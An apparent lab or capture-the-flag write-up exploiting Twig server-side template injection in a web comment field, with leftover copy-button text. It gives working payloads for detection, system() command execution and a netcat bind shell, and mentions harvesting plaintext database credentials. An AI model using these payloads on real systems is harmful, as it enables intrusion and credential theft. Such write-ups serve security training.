# Exploitation

## Reconnaissance
A port scan revealed the following services:
- HTTP service running on port 80
- MySQL service running on port 3306

The web application was accessible via a browser and allowed
user-generated comments, which became the primary attack vector.

## SSTI Detection
The following payload was submitted via the comment field to test
whether server-side template evaluation was occurring:

```twig
{{7*7}}
The application responded with:

text
Kodu kopyala
49
This confirmed that user input was being evaluated by a server-side
template engine.

Template Engine Identification
To identify the template engine, the following payload was used:

twig
Kodu kopyala
{{7*'7'}}
The output was:

text
Kodu kopyala
49
This behavior is consistent with Twig, as Jinja2 would return
7777777 instead.

Command Execution
Twig allows function filters to be abused in insecure configurations.
The following payload demonstrated arbitrary command execution:

twig
Kodu kopyala
{{ ['id'] | filter('system') }}
The output confirmed that commands were executed as the web server user.

Shell Access
To gain interactive access to the target system, a bind shell was
initiated on the server:

twig
Kodu kopyala
{{ ['nc -nvlp 1337 -e /bin/bash'] | filter('system') }}
A connection to the specified port resulted in a shell with
www-data privileges.

Post-Exploitation
After gaining shell access, the system was enumerated.
Configuration files were discovered that contained database credentials
stored in plaintext within the application directory.
